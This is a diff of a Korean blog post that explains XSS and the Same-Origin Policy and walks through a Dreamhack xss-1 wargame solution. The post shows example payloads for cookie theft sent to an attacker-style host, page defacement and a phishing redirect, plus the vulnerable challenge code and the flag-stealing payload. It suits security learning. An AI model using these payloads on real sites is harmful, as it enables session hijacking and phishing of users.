@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>[보안] XSS 부셔보고 SOP 알아보기! | nogarden.log</title>
-    <meta name="description" content="XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수 있는 클라이언트 사이드 취약점이다. 하나 예시를 들어보자">
+    <meta name="description" content="XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수…">
     <meta name="author" content="노정원">
     <meta name="keywords" content="노정원, 보안, 웹, 통신">
     <link rel="canonical" href="https://njw.kro.kr/blog/posts/%EB%B3%B4%EC%95%88-XSS-%EB%B6%80%EC%85%94%EB%B3%B4%EA%B8%B0/">
@@ -13,7 +13,7 @@
     <meta property="og:locale" content="ko_KR">
     <meta property="og:site_name" content="nogarden.log">
     <meta property="og:title" content="[보안] XSS 부셔보고 SOP 알아보기!">
-    <meta property="og:description" content="XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수 있는 클라이언트 사이드 취약점이다. 하나 예시를 들어보자">
+    <meta property="og:description" content="XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수…">
     <meta property="og:image" content="https://velog.velcdn.com/images/njw/post/3f1b55b4-166e-416c-b059-bdff05b0150e/image.png">
     <meta property="og:url" content="https://njw.kro.kr/blog/posts/%EB%B3%B4%EC%95%88-XSS-%EB%B6%80%EC%85%94%EB%B3%B4%EA%B8%B0/">
     <meta property="article:published_time" content="2026-04-25T04:00:30.953Z">
@@ -23,18 +23,26 @@
     <meta property="article:tag" content="통신">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="[보안] XSS 부셔보고 SOP 알아보기!">
-    <meta name="twitter:description" content="XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수 있는 클라이언트 사이드 취약점이다. 하나 예시를 들어보자">
+    <meta name="twitter:description" content="XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수…">
     <meta name="twitter:image" content="https://velog.velcdn.com/images/njw/post/3f1b55b4-166e-416c-b059-bdff05b0150e/image.png">
-    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":"https://njw.kro.kr/blog/posts/%EB%B3%B4%EC%95%88-XSS-%EB%B6%80%EC%85%94%EB%B3%B4%EA%B8%B0/","headline":"[보안] XSS 부셔보고 SOP 알아보기!","description":"XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수 있는 클라이언트 사이드 취약점이다. 하나 예시를 들어보자","image":"https://velog.velcdn.com/images/njw/post/3f1b55b4-166e-416c-b059-bdff05b0150e/image.png","datePublished":"2026-04-25T04:00:30.953Z","dateModified":"2026-04-25T04:00:30.953Z","keywords":"보안, 웹, 통신","inLanguage":"ko","author":{"@type":"Person","@id":"https://njw.kro.kr/#person","name":"노정원","url":"https://njw.kro.kr/"},"publisher":{"@type":"Person","name":"노정원","url":"https://njw.kro.kr/"}}</script>
-    <link rel="alternate" type="application/rss+xml" title="nogarden.log" href="https://njw.kro.kr/blog/rss.xml">
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":"https://njw.kro.kr/blog/posts/%EB%B3%B4%EC%95%88-XSS-%EB%B6%80%EC%85%94%EB%B3%B4%EA%B8%B0/","headline":"[보안] XSS 부셔보고 SOP 알아보기!","description":"XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점XSS(Cross-Site Scripting)는 여기서 볼 수 있는 쿠키와 세션 방식을 악용할 수…","image":"https://velog.velcdn.com/images/njw/post/3f1b55b4-166e-416c-b059-bdff05b0150e/image.png","datePublished":"2026-04-25T04:00:30.953Z","dateModified":"2026-04-25T04:00:30.953Z","keywords":"보안, 웹, 통신","inLanguage":"ko","author":{"@type":"Person","@id":"https://njw.kro.kr/#person","name":"노정원","url":"https://njw.kro.kr/"},"publisher":{"@type":"Person","name":"노정원","url":"https://njw.kro.kr/"}}</script>
+    <link rel="alternate" type="application/rss+xml" title="nogarden.log — 노정원 개발 블로그" href="https://njw.kro.kr/blog/rss.xml">
+    <link rel="me" href="https://github.com/njwon">
+    <link rel="me" href="https://velog.io/@njw">
     <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
     <link rel="preconnect" href="https://fastly.jsdelivr.net" crossorigin>
+    <link rel="preconnect" href="https://velog.velcdn.com">
     <link rel="stylesheet" href="/css/font.css" />
     <link rel="stylesheet" href="/blog/blog.css" />
-    <link rel="icon" href="/img/noise/Sarah.webp" />
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@5/github-markdown-dark.min.css">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11/build/styles/github-dark.min.css">
-    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11/build/highlight.min.js" defer></script>
+    <link rel="icon" href="https://njw.kro.kr/favicon.ico" sizes="48x48">
+    <link rel="icon" href="https://njw.kro.kr/img/favicon.png" type="image/png" sizes="192x192">
+    <link rel="apple-touch-icon" href="https://njw.kro.kr/img/apple-touch-icon.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@5/github-markdown-dark.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11/build/styles/github-dark.min.css" media="print" onload="this.media='all'">
+    <noscript>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@5/github-markdown-dark.min.css">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11/build/styles/github-dark.min.css">
+    </noscript>
 </head>
 
 <body>
@@ -44,8 +52,8 @@
         <div class="header-row">
             <div class="header-info">
                 <a href="/blog/" class="back-link">&#8592; Blog</a>
-                <p class="blog-title">nogarden.log</p>
-                <p class="blog-desc">어제보다 더 나은 오늘, 오늘보다 더 나은 내일의 코드를 짠다.</p>
+                <p class="blog-title"><a href="/blog/" style="color:inherit;text-decoration:none">nogarden.log</a></p>
+                <p class="blog-desc"><a href="/" rel="author" style="color:inherit">노정원(njwon)</a>의 개발 블로그 · 어제보다 더 나은 오늘, 오늘보다 더 나은 내일의 코드를 짠다.</p>
             </div>
         </div>
     </header>
@@ -55,6 +63,7 @@
             <div class="post-header">
                 <h1 class="post-title">[보안] XSS 부셔보고 SOP 알아보기!</h1>
                 <div class="post-meta">
+                    <a class="post-author" href="/" rel="author">노정원</a>
                     <time class="post-date" datetime="2026-04-25T04:00:30.953Z">2026.04.25</time>
                     <span class="post-series">보안</span>
                 </div>
@@ -62,13 +71,13 @@
             </div>
             <div class="post-thumbnail-wrap"><img class="post-thumbnail" src="https://velog.velcdn.com/images/njw/post/3f1b55b4-166e-416c-b059-bdff05b0150e/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기! 썸네일"></div>
             <div class="post-body markdown-body">
-<h1>XSS</h1>
+<h2>XSS</h2>
 <blockquote>
 <p>XSS란, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 웹 취약점</p>
 </blockquote>
 <p>**XSS(Cross-Site Scripting)**는 <a href="https://velog.io/@njw/%EB%B3%B4%EC%95%88-%EC%9B%B9%EC%9D%98-%EC%9D%B8%EC%A6%9D-%EB%B0%A9%EC%8B%9D">여기서</a> 볼 수 있는 <b>쿠키와 세션 방식을 악용</b>할 수 있는 <b>클라이언트 사이드 취약점</b>이다. </p>
-<h2>방식</h2>
-<p>하나 예시를 들어보자.<br><img src="https://velog.velcdn.com/images/njw/post/3f1b55b4-166e-416c-b059-bdff05b0150e/image.png" alt=""><br>사람들에게 글을 쓰고 볼 수 있는 기능을 제공하는 커뮤니티 웹 서비스가 있다고 생각해보자.</p>
+<h3>방식</h3>
+<p>하나 예시를 들어보자.<br><img src="https://velog.velcdn.com/images/njw/post/3f1b55b4-166e-416c-b059-bdff05b0150e/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기!" loading="lazy" decoding="async"><br>사람들에게 글을 쓰고 볼 수 있는 기능을 제공하는 커뮤니티 웹 서비스가 있다고 생각해보자.</p>
 <p>평범한 이용자들은 단순히 개발자의 의도대로 자연어로 이루어진 글을 게시할 뿐이겠지만, 여기서 공격자가 <b>인터널 자바스크립트  <code>&lt;script&gt;&lt;/script&gt;</code>를 포함한 글을 게시하면 그 글을 열어본 유저에게는 클라이언트 사이드 스크립트</b>가 로드되어 실행될 것이다.</p>
 <p>이같은 경우를 XSS라고 부르는 것이다.</p>
 <p>XSS는 크게 네가지의 공격기법이 있다.</p>
@@ -106,143 +115,147 @@
 </blockquote>
 <p><b>Reflected XSS</b> 기법을 이용하는 방법중엔 대표적으로 게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있다. 이용자가 게시물을 검색하면 서버에서는 검색 결과를 이용자에게 반환한다. 일부 서비스에서는 검색 결과를 응답에 포함하는데, <b>검색 문자열에 악성 스크립트가 포함되어 있다면 Reflected XSS</b>가 발생할 수 있다.</p>
 <p>쉽게 말해서 커뮤니티의 글은 <b>DB에 담겨오니 Stored XSS</b>이고,<br>검색을 할 경우 URL에 포함되어 전송되고 <b>DB에 담기지 않고 서버에서 반환되어 오니 Reflected XSS</b>이다.</p>
-<h3>SOP 정책</h3>
+<h4>SOP 정책</h4>
 <p>위에서 <b>Universal XSS는 SOP 정책을 우회하는 XSS</b>라고 서술한 바 있다.<br><a href="https://velog.io/@njw/%EB%B3%B4%EC%95%88-%EC%9B%B9%EC%9D%98-%EC%9D%B8%EC%A6%9D-%EB%B0%A9%EC%8B%9D">브라우저는 인증 정보로 사용될 수 있는 쿠키를 브라우저 내부에 보관한다.</a> 그리고 <b>이용자가 웹 서비스에 접속할 때, 브라우저는 해당 웹 서비스에서 사용하는 인증 정보인 쿠키를 HTTP 요청에 포함시켜 전달</b>한다. 이와 같은 특징은 사이트에 직접 접속하는 것에만 한정되지 않는다. 브라우저는 웹 리소스를 통해 간접적으로 <b>타 사이트에 접근</b>할 때도 인증 정보인 <b>쿠키를 함께 전송</b>하는 특징을 가지고 있다.</p>
 <p>이 특징 때문에 <b>악의적인 페이지가 클라이언트의 권한을 이용해 대상 사이트에 HTTP 요청을 보내고, HTTP 응답 정보를 획득 하는 코드</b>를 <b>실행</b>할 수 있다. 이는 정보 유출과 같은 보안 위협이 생길 수 있는 요소가 된다. 따라서, 클라이언트 입장에서는 가져온 데이터를 <b>악의적인 페이지에서 읽을 수 없도록 해야 하고 해당 웹서비스에서만 읽을 수 있도록 해야한다.</b> 이것이 바로 **SOP(동일 출처 정책, Same Origin Policy)**이라고 불리우는 보안 메커니즘이다.</p>
 <p>SOP는 URL의 구성요소 중 프로토콜(스키마)과 호스트와 포트를 확인한다.<br><a href="https://njwon.com:31240">https://njwon.com:31240</a><br>(프로토콜(스키마))  (호스트)  (포트)<br>이 중 하나라도 쿠키를 발급한 웹 서비스와 다르다면 <b>Cross Origin</b>으로 판별하고 아니라면 <b>Same Origin</b>으로 판별한다.</p>
 <p>SOP는 <b>Same Origin일 때만 정보를 읽도록 한다.</b></p>
-<h2>XSS 페이로드</h2>
+<h3>XSS 페이로드</h3>
 <p>XSS는 다음과 같은 형태로 존재할 수 있다.<br><b><div style="text-align: center"> 쿠키 및 세션 탈취 공격 코드 </div></b></p>
-<pre><code>&lt;script&gt;
-    // 현재 페이지의 쿠키(return type: string)
-    document.cookie; 
-    // 쿠키 생성(key: name, value: test)
-    document.cookie = &quot;name=test;&quot;;
-    // new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
-    // &quot;http://hacker.dreamhack.io/?cookie=현재페이지의쿠키&quot; 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
-    new Image().src = &quot;http://hacker.njwon.io/?cookie=&quot; + document.cookie;
-&lt;/script&gt;
-</code></pre>
+<pre><code class="hljs language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+    <span class="hljs-comment">// 현재 페이지의 쿠키(return type: string)</span>
+    <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>; 
+    <span class="hljs-comment">// 쿠키 생성(key: name, value: test)</span>
+    <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;name=test;&quot;</span>;
+    <span class="hljs-comment">// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io</span>
+    <span class="hljs-comment">// &quot;http://hacker.dreamhack.io/?cookie=현재페이지의쿠키&quot; 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함</span>
+    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>().<span class="hljs-property">src</span> = <span class="hljs-string">&quot;http://hacker.njwon.io/?cookie=&quot;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>;
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
 <p><b><div style="text-align: center"> 페이지 변조 공격 코드 </div></b></p>
-<pre><code>&lt;script&gt;
-  // 이용자의 페이지 정보에 접근.
-  document;
-  // 이용자의 페이지에 데이터를 삽입.
-  document.write(&quot;Hacked By Dreamhack !&quot;);
-&lt;/script&gt;
-</code></pre>
+<pre><code class="hljs language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+  <span class="hljs-comment">// 이용자의 페이지 정보에 접근.</span>
+  <span class="hljs-variable language_">document</span>;
+  <span class="hljs-comment">// 이용자의 페이지에 데이터를 삽입.</span>
+  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;Hacked By Dreamhack !&quot;</span>);
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
 <p><b><div style="text-align: center"> 위치 이동 공격 코드 </div></b></p>
-<pre><code>&lt;script&gt;
-    // 이용자의 위치를 변경.
-    // 피싱 공격 등으로 사용됨.
-    location.href = &quot;http://hacker.dreamhack.io/phishing&quot;; 
-    // 새 창 열기
-    window.open(&quot;http://hacker.dreamhack.io/&quot;)
-&lt;/script&gt;
-</code></pre>
-<h2>wargame 풀이</h2>
+<pre><code class="hljs language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+    <span class="hljs-comment">// 이용자의 위치를 변경.</span>
+    <span class="hljs-comment">// 피싱 공격 등으로 사용됨.</span>
+    location.<span class="hljs-property">href</span> = <span class="hljs-string">&quot;http://hacker.dreamhack.io/phishing&quot;</span>; 
+    <span class="hljs-comment">// 새 창 열기</span>
+    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;http://hacker.dreamhack.io/&quot;</span>)
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre>
+<h3>wargame 풀이</h3>
 <p><a href="https://dreamhack.io/wargame/challenges/28">xss-1</a> 워게임 문제를 풀이해 보았다.</p>
-<pre><code>#!/usr/bin/python3
+<pre><code class="hljs language-dns">#!/usr/bin/python3
 from flask import Flask, request, render_template
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 import urllib
 import os
 
-app = Flask(__name__)
-app.secret_key = os.urandom(32)
+app = Flask<span class="hljs-punctuation">(</span>__name__<span class="hljs-punctuation">)</span>
+app.secret_key = os.urandom<span class="hljs-punctuation">(</span><span class="hljs-number">32</span><span class="hljs-punctuation">)</span>
 
 try:
-    FLAG = open(&quot;./flag.txt&quot;, &quot;r&quot;).read()
+    FLAG = open<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;./flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span><span class="hljs-punctuation">)</span>.read<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
 except:
-    FLAG = &quot;[**FLAG**]&quot;
+    FLAG = <span class="hljs-string">&quot;[**FLAG**]&quot;</span>
 
 
-def read_url(url, cookie={&quot;name&quot;: &quot;name&quot;, &quot;value&quot;: &quot;value&quot;}):
-    cookie.update({&quot;domain&quot;: &quot;127.0.0.1&quot;})
+def read_url<span class="hljs-punctuation">(</span>url, cookie={<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;value&quot;</span>}<span class="hljs-punctuation">)</span>:
+    cookie.update<span class="hljs-punctuation">(</span>{<span class="hljs-string">&quot;domain&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>}<span class="hljs-punctuation">)</span>
     driver = None
     try:
-        service = Service(executable_path=&quot;/usr/local/bin/chromedriver&quot;)
-        options = webdriver.ChromeOptions()
-        options.binary_location = &quot;/usr/bin/google-chrome&quot;
-        for _ in [
-            &quot;headless&quot;,
-            &quot;window-size=1920x1080&quot;,
-            &quot;disable-gpu&quot;,
-            &quot;no-sandbox&quot;,
-            &quot;disable-dev-shm-usage&quot;,
+        service = Service<span class="hljs-punctuation">(</span>executable_path=<span class="hljs-string">&quot;/usr/local/bin/chromedriver&quot;</span><span class="hljs-punctuation">)</span>
+        options = webdriver.ChromeOptions<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
+        options.binary_location = <span class="hljs-string">&quot;/usr/bin/google-chrome&quot;</span>
+        for _ <span class="hljs-type">in</span> [
+            <span class="hljs-string">&quot;headless&quot;</span>,
+            <span class="hljs-string">&quot;window-size=1920x1080&quot;</span>,
+            <span class="hljs-string">&quot;disable-gpu&quot;</span>,
+            <span class="hljs-string">&quot;no-sandbox&quot;</span>,
+            <span class="hljs-string">&quot;disable-dev-shm-usage&quot;</span>,
         ]:
-            options.add_argument(_)
-        driver = webdriver.Chrome(service=service, options=options)
-        driver.implicitly_wait(3)
-        driver.set_page_load_timeout(3)
-        driver.get(&quot;http://127.0.0.1:8000/&quot;)
-        driver.add_cookie(cookie)
-        driver.get(url)
+            options.add_argument<span class="hljs-punctuation">(</span>_<span class="hljs-punctuation">)</span>
+        driver = webdriver.Chrome<span class="hljs-punctuation">(</span>service=service, options=options<span class="hljs-punctuation">)</span>
+        driver.implicitly_wait<span class="hljs-punctuation">(</span><span class="hljs-number">3</span><span class="hljs-punctuation">)</span>
+        driver.set_page_load_timeout<span class="hljs-punctuation">(</span><span class="hljs-number">3</span><span class="hljs-punctuation">)</span>
+        driver.get<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span><span class="hljs-punctuation">)</span>
+        driver.add_cookie<span class="hljs-punctuation">(</span>cookie<span class="hljs-punctuation">)</span>
+        driver.get<span class="hljs-punctuation">(</span>url<span class="hljs-punctuation">)</span>
     except Exception as e:
-        # return str(e)
+        # return str<span class="hljs-punctuation">(</span>e<span class="hljs-punctuation">)</span>
         return False
     finally:
         if driver is not None:
-            driver.quit()
+            driver.quit<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>
     return True
 
 
-def check_xss(param, cookie={&quot;name&quot;: &quot;name&quot;, &quot;value&quot;: &quot;value&quot;}):
-    url = f&quot;http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}&quot;
-    return read_url(url, cookie)
+def check_xss<span class="hljs-punctuation">(</span>param, cookie={<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: <span class="hljs-string">&quot;value&quot;</span>}<span class="hljs-punctuation">)</span>:
+    url = f<span class="hljs-string">&quot;http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}&quot;</span>
+    return read_url<span class="hljs-punctuation">(</span>url, cookie<span class="hljs-punctuation">)</span>
 
 
-@app.route(&quot;/&quot;)
-def index():
-    return render_template(&quot;index.html&quot;)
+@app.route<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;/&quot;</span><span class="hljs-punctuation">)</span>
+def index<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>:
+    return render_template<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;index.html&quot;</span><span class="hljs-punctuation">)</span>
 
 
-@app.route(&quot;/vuln&quot;)
-def vuln():
-    param = request.args.get(&quot;param&quot;, &quot;&quot;)
+@app.route<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;/vuln&quot;</span><span class="hljs-punctuation">)</span>
+def vuln<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>:
+    param = request.args.get<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">)</span>
     return param
 
 
-@app.route(&quot;/flag&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
-def flag():
-    if request.method == &quot;GET&quot;:
-        return render_template(&quot;flag.html&quot;)
-    elif request.method == &quot;POST&quot;:
-        param = request.form.get(&quot;param&quot;)
-        if not check_xss(param, {&quot;name&quot;: &quot;flag&quot;, &quot;value&quot;: FLAG.strip()}):
-            return &#39;&lt;script&gt;alert(&quot;wrong??&quot;);history.go(-1);&lt;/script&gt;&#39;
+@app.route<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;/flag&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]<span class="hljs-punctuation">)</span>
+def flag<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>:
+    if request.method == <span class="hljs-string">&quot;GET&quot;</span>:
+        return render_template<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;flag.html&quot;</span><span class="hljs-punctuation">)</span>
+    elif request.method == <span class="hljs-string">&quot;POST&quot;</span>:
+        param = request.form.get<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;param&quot;</span><span class="hljs-punctuation">)</span>
+        if not check_xss<span class="hljs-punctuation">(</span>param, {<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>: FLAG.strip<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>}<span class="hljs-punctuation">)</span>:
+            return &#x27;&lt;script&gt;alert<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;wrong??&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-comment">;history.go(-1);&lt;/script&gt;&#x27;</span>
 
-        return &#39;&lt;script&gt;alert(&quot;good&quot;);history.go(-1);&lt;/script&gt;&#39;
-
-
-memo_text = &quot;&quot;
+        return &#x27;&lt;script&gt;alert<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;good&quot;</span><span class="hljs-punctuation">)</span><span class="hljs-comment">;history.go(-1);&lt;/script&gt;&#x27;</span>
 
 
-@app.route(&quot;/memo&quot;)
-def memo():
+memo_text = <span class="hljs-string">&quot;&quot;</span>
+
+
+@app.route<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;/memo&quot;</span><span class="hljs-punctuation">)</span>
+def memo<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>:
     global memo_text
-    text = request.args.get(&quot;memo&quot;, &quot;&quot;)
-    memo_text += text + &quot;\n&quot;
-    return render_template(&quot;memo.html&quot;, memo=memo_text)
+    text = request.args.get<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;memo&quot;</span>, <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">)</span>
+    memo_text += text + <span class="hljs-string">&quot;<span class="hljs-char escape_">\n</span>&quot;</span>
+    return render_template<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;memo.html&quot;</span>, memo=memo_text<span class="hljs-punctuation">)</span>
 
 
-app.run(host=&quot;0.0.0.0&quot;, port=8000)
-</code></pre>
-<p>이 부분을 통해 <b>FLAG 변수</b>에 <b>플래그</b>가 담기는 것을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/3d7ab754-a6f0-4320-a07e-90de76be3622/image.png" alt=""></p>
-<p>/vuln 엔드포인트에서는 <b>파라미터를 그대로 반환</b>해 XSS 공격이 가능함을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/79c7b3ec-d367-4cc5-b54e-faabe952d306/image.png" alt=""></p>
-<p>이 부분을 통해 /flag 엔드포인트에서 check_xss에 사용자의 요청값과 플래그를 포함해 넘기는 것을 알 수 있는데<br><img src="https://velog.velcdn.com/images/njw/post/313cf32f-d697-45e6-957a-b59347830ce2/image.png" alt=""></p>
-<p>check_xss는 동적으로 URL을 만들어 <b>서버에서 chrome 드라이버를 통해 쿠키를 만들고 동적으로 만든 URL을 열어본다는 것</b>을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/68a6f591-f114-4c68-bb54-e1da87c75316/image.png" alt=""></p>
-<p>/memo 엔드포인트를 살펴보면 render_template()을 이용해 입력값을 출력하기 때문에 <b>XSS가 발생하지 않는다</b>는 것을 알 수 있는데 memo 파라미터를 이용해 변수에 담아 <b>지속적으로 기록하고 출력</b>하는 것을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/2e57873e-6e43-4436-843b-50ec5ec2f926/image.png" alt=""></p>
-<h3>취약점 분석</h3>
+app.run<span class="hljs-punctuation">(</span>host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span><span class="hljs-punctuation">)</span></code></pre>
+<p>이 부분을 통해 <b>FLAG 변수</b>에 <b>플래그</b>가 담기는 것을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/3d7ab754-a6f0-4320-a07e-90de76be3622/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기!" loading="lazy" decoding="async"></p>
+<p>/vuln 엔드포인트에서는 <b>파라미터를 그대로 반환</b>해 XSS 공격이 가능함을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/79c7b3ec-d367-4cc5-b54e-faabe952d306/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기!" loading="lazy" decoding="async"></p>
+<p>이 부분을 통해 /flag 엔드포인트에서 check_xss에 사용자의 요청값과 플래그를 포함해 넘기는 것을 알 수 있는데<br><img src="https://velog.velcdn.com/images/njw/post/313cf32f-d697-45e6-957a-b59347830ce2/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기!" loading="lazy" decoding="async"></p>
+<p>check_xss는 동적으로 URL을 만들어 <b>서버에서 chrome 드라이버를 통해 쿠키를 만들고 동적으로 만든 URL을 열어본다는 것</b>을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/68a6f591-f114-4c68-bb54-e1da87c75316/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기!" loading="lazy" decoding="async"></p>
+<p>/memo 엔드포인트를 살펴보면 render_template()을 이용해 입력값을 출력하기 때문에 <b>XSS가 발생하지 않는다</b>는 것을 알 수 있는데 memo 파라미터를 이용해 변수에 담아 <b>지속적으로 기록하고 출력</b>하는 것을 알 수 있다.<br><img src="https://velog.velcdn.com/images/njw/post/2e57873e-6e43-4436-843b-50ec5ec2f926/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기!" loading="lazy" decoding="async"></p>
+<h4>취약점 분석</h4>
 <p>/flag 엔드포인트에서 <code>&lt;script&gt;location.href = &quot;/memo?memo=&quot; + document.cookie;&lt;/script&gt;</code> 이와 같은 페이로드를 입력하면 서버가 플래그 쿠키를 넣고 URL을 열기 때문에 <b>서버의 브라우저에 있는 쿠키</b>가 <b>출력</b>된다는 것을 알 수 있다.</p>
-<p>플래그 획득 성공!<br><img src="https://velog.velcdn.com/images/njw/post/e3517ab1-be5f-4871-8a44-d2c9d34cbb75/image.png" alt=""></p>
-<h2>XSS 방어</h2>
+<p>플래그 획득 성공!<br><img src="https://velog.velcdn.com/images/njw/post/e3517ab1-be5f-4871-8a44-d2c9d34cbb75/image.png" alt="[보안] XSS 부셔보고 SOP 알아보기!" loading="lazy" decoding="async"></p>
+<h3>XSS 방어</h3>
 <p>XSS가 사용자의 악의적인 입력값 주입과 텍스트를 인터널 자바스크립트와 같은 태그로 인식하여 생기는 취약점 이므로 <b>서버 단의 철저한 입력값 검증</b>과 출력할 때 <code>&amp;lt;</code>, <code>&amp;gt;</code>와 같은 <b>특수 입력 기호</b>를 <b>이용</b>하면 대부분의 XSS는 방어 가능하다.</p>
-<h1>마무리</h1>
+<h2>마무리</h2>
 <p>XSS에 대해 공부해보았다. 단순하지만 무서운 취약점이니 꼭 파악해 방어하자.</p>
 
